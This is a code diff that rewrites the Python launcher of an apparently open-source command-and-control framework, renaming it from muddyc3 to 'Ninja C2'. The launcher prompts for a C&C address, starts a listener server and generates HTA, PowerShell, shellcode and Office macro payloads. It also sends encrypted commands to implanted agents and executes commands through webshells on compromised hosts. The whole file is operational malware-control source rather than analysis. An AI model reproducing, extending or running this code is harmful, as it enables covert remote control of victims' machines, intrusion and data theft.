@@ -1,137 +1,164 @@
-# Embedded file name: muddyc3.py
-import signal
-import readline
-import sys
-import time
-from core import config
-from core import webshell
-import os
-from pathlib import Path
+#!/usr/bin/env python3
 
-#try:
-#    from core import config
-#except Exception as e:
-#    print("Error : %s"%e)
-#    print("if you installed all dependancies run : python start_campaign.py to intialize the configuration")
-#    exit()
+__program__ = "Ninja c2"
+__version__ = "2.0"
 
-from core.payloads import *
-from core import webserver
-from core import header
-from core.cmd import cmd
-from core.cmd import *
-from core.config import *
-#from core.config  import *
-from core.color import bcolors
-from core.Encryption import *
-from core.config import AESKey
-#import urllib2
-import threading
 import _thread
-import time
+import threading
+from shlex import split
 
-def signal_handler(sig, frame):
-        print('Exit by typing exit')
-        #sys.exit(0)
+from rich.console import Console
+import argparse
+from core.cmd import *
+from core.payloads import *
 
-def creat_dirs(dirs):
-    try:
-        os.makedirs(dirs)
-    except OSError as e:
-        return
+console = Console()
 
-def main():
-    creat_dirs("payloads")
-    creat_dirs("downloads")
-    creat_dirs("file")
-    creat_dirs("images")
-    creat_dirs("DA")
-    creat_dirs("kerberoast")
-    creat_dirs("screenshots")
 
-    signal.signal(signal.SIGINT, signal_handler)
-    header.Banner()
+class Ninja:
+    def __init__(self, arg):
+        self.quiet = arg.quiet
 
-    #config.set_key()
-    CC = []
-    if config.HOST=="" or config.PORT=="":
-        while len(CC) == 0:
-            CC = input('Enter a DN/IP:port for C&C: ip:port: ')
-        CC = CC.split(':')
-        config.set_port(CC[1])
-        config.set_ip(CC[0])
-    #proxy = input('Enter PROXY:')
-    #if proxy:
-    #    ip = proxy
+    def create_dirs(self, dirs):
+        try:
+            os.makedirs(dirs)
+        except OSError:
+            return
 
-    server = threading.Thread(target=webserver.main, args=())
-    server.start()
-    time.sleep(0.5)
-    print('+' + '-' * 60 + '+')
-    cmd().help()
-    print('+' + '-' * 60 + '+')
-    print( bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
-    hta_paylods()
-    print(bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC)
-    pwsh_job()
-    print(bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC)
-    pwsh_file()
-    pwsh_sct()
-    simple_payloads()
-    pwsh_base64()
-    pwsh_base52()
-    print('+' + '-' * 60 + '+')
+    def NinjaCMD(self):
+        while True:
+            try:
+                """Adding tab completion and adding to history file"""
+                readline.set_completer(Command_Completer)
+                readline.parse_and_bind("tab: complete")
+                readline.write_history_file(".history")
 
-    config.PAYLOAD()
-    config.obfuscate()
-    config.STAGER()
-    cspayload()
-    if config.Donut==True:
-        print("Donut Disabled so , kindly create a new campaign ")
-        donut_shellcode()
-        config.migrator()
-    cmd_shellcodex86()
-    cmd_shellcodex64()
-    word_macro()
-    excel_macro()
-    f=open(".history","a").write("\n")
-    readline.read_history_file(".history")
-    try:
-        print("loading registered webshell list")
-        with open('.webshells', 'rb') as f:
-            config.WEBSHELLS = pickle.load(f)
-    except:
-        print("webshell list file doesn't exist.")
-    while True:
-        readline.set_completer(Command_Completer)
-        readline.parse_and_bind("tab: complete")
-        readline.write_history_file(".history")
-        if config.POINTER == 'main':
-            command = input('(%s : %s) ' % (config.BASE, config.POINTER))
-        elif config.POINTER == 'webshell':
-            command = input('(%s : %s) ' % (config.BASE, config.POINTER))
-        elif config.Implant_Type=='agent':
-            command = input('(%s : Agent(%s)-%s) ' % (config.BASE, str(config.AGENTS[config.POINTER][0]),bcolors.FAIL + config.AGENTS[config.POINTER][5] + bcolors.ENDC ))
-        elif config.Implant_Type=='webshell':
-            command = input('(%s : webshell(%s)@%s) ' % (config.BASE, str(config.WEBSHELLS[config.POINTER][0]),bcolors.FAIL + config.WEBSHELLS[config.POINTER][1]+ bcolors.ENDC ))
-        bcommand = command.strip().split()
+                """Displaying Ninja prompt based on what we are interacting with"""
+                if config.POINTER == 'main':
+                    command = console.input(f'[bold yellow]({config.BASE}:{config.POINTER})>[/ bold yellow] ')
+                elif config.POINTER == 'webshell':
+                    command = console.input(f'[bold cyan]({config.BASE}:{config.POINTER})> [/bold cyan]')
+                elif config.Implant_Type == 'agent':
+                    agent = str(config.AGENTS[config.POINTER][0])
+                    agent2 = config.AGENTS[config.POINTER][5]
+                    command = console.input(f'[bold green]({config.BASE} : Agent({agent})-{agent2})[/bold green]')
+                elif config.Implant_Type == 'webshell':
+                    webshell1 = str(config.WEBSHELLS[config.POINTER][0])
+                    webshell2 = config.WEBSHELLS[config.POINTER][1]
+                    command = console.input(f'[bold red]({config.BASE} : webshell({webshell1})@{webshell2})[/bold red]')
+                bcommand = split(command)  # split from shlex module
 
-        if bcommand:
-            if bcommand[0] in cmd.COMMANDS:
-                result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
-            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type=='agent':
-                config.COMMAND[config.POINTER].append(encrypt(AESKey,command.strip()))
+                if bcommand:
+                    if bcommand[0] in cmd.COMMANDS:
+                        result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
+                    elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'agent':
+                        config.COMMAND[config.POINTER].append(encrypt(AESKey, command.strip()))
 
-            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type=='webshell':
+                    elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'webshell':
+                        try:
+                            _thread.start_new_thread(webshell.webshell_execute,
+                                                     (config.WEBSHELLS[config.POINTER], command.strip(),))
 
-                #webshell.webshell_execute(config.WEBSHELLS[config.POINTER],command.strip())
-                try:
-                    _thread.start_new_thread( webshell.webshell_execute, (config.WEBSHELLS[config.POINTER],command.strip(), ) )
+                        except:
+                            console.print("[!] Error: unable to start thread", style="bold red")
+                            console.print_exception()
+            except (EOFError, KeyboardInterrupt):  # Handles Ctrl+C and Ctrl+D (NO exit)
+                console.print("\n[!] Type exit", style="bold red")
+                continue
 
-                except:
-                    print ("Error: unable to start thread")
+    def Make_Payloads(self):
+        print('+' + '-' * 60 + '+')
+        cmd().help()
+        print('+' + '-' * 60 + '+')
+        print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
+        hta_paylods()
+        print(bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC)
+        pwsh_job()
+        print(bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC)
+        pwsh_file()
+        pwsh_sct()
+        simple_payloads()
+        pwsh_base64()
+        pwsh_base52()
+        print('+' + '-' * 60 + '+')
+        config.PAYLOAD()
+        config.obfuscate()
+        config.STAGER()
+        cspayload()
+        cmd_shellcodex86()
+        cmd_shellcodex64()
+        word_macro()
+        excel_macro()
+        if not config.Donut:
+            console.log("[!] Donut is Disabled so , kindly create a new campaign", style="bold red")
+        else:
+            donut_shellcode()
+            config.migrator()
+
+    def main(self):
+        self.create_dirs("payloads")
+        self.create_dirs("downloads")
+        self.create_dirs("file")
+        self.create_dirs("images")
+        self.create_dirs("DA")
+        self.create_dirs("kerberoast")
+        self.create_dirs("screenshots")
+
+        CC = []
+        if config.HOST == "" or config.PORT == "":
+            while len(CC) == 0:
+                CC = console.input('[cyan][-] Enter a DN/IP:port for C&C: IP:Port: [/cyan]')
+            CC = CC.split(':')
+            config.set_port(CC[1])
+            config.set_ip(CC[0])
+
+        """Start webserver"""
+        server = threading.Thread(target=webserver.main, args=())
+        server.start()
+        time.sleep(0.5)
+
+        """Make payloads"""
+        self.Make_Payloads()
+
+        """Reading history file content to use"""
+        f = open(".history", "a").write("\n")
+        readline.read_history_file(".history")
+
+        """Loading webshell if exist"""
+        try:
+            console.print("[*] Loading registered webshell list", style="cyan")
+            with open('.webshells', 'rb') as f:
+                config.WEBSHELLS = pickle.load(f)
+        except FileNotFoundError:
+            console.print("[!] Webshell list file doesn't exist.\n", style="red")
+
+        """Start Ninja Command line"""
+        self.NinjaCMD()
+
+    @staticmethod
+    def Banner():
+        console.print(f"""[blue]
+    ███╗   ██╗██╗███╗   ██╗     ██╗ █████╗      ██████╗██████╗ 
+    ████╗  ██║██║████╗  ██║     ██║██╔══██╗    ██╔════╝╚════██╗
+    ██╔██╗ ██║██║██╔██╗ ██║     ██║███████║    ██║      █████╔╝
+    ██║╚██╗██║██║██║╚██╗██║██   ██║██╔══██║    ██║     ██╔═══╝ 
+    ██║ ╚████║██║██║ ╚████║╚█████╔╝██║  ██║    ╚██████╗███████╗
+    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═╝     ╚═════╝╚══════╝	
+                                                            [/blue][bold cyan]Version: {config.VERSION}[/bold cyan]
+[bold yellow][-] Ninja C2 | Stealthy Pwn like a Ninja[/bold yellow]\n\n""")
+
+
 if __name__ == '__main__':
-    try :
-        main()
-    except Exception as e:
-        print( '[-] ERROR(main): %s' % str(e))
+    try:
+        """Adding arguments, Currently just for q peacefully and quiet startup"""
+        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter, add_help=False)
+        parser.add_argument('-q', '--quiet', help='Disable payload listing at the start')
+        args = parser.parse_args()
+        """Create an instance of the class"""
+        ninja = Ninja(args)
+        """Display banner"""
+        Ninja.Banner()
+        """Run Ninja"""
+        ninja.main()
+    except Exception:
+        console.print_exception()
